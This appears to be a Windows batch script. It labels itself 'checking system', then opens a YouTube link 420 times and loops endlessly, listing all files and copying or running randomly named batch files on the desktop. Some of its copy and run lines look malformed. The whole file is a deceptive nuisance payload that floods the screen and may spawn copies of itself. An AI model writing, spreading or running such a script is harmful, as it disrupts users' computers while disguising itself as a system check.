@echo off

echo checking system:

for /l %%x in (1, 1, 420) do (
   START https://youtu.be/6Joyj0dmkug?si=yomdNgUyhBfEoZ44
   timeout /t 1 /nobreak
)

Pause

:1

dir /s

copy c:\tmp.bat

c:\document~1\%username%\desktop\greatgame_%random%.bat
goto 1


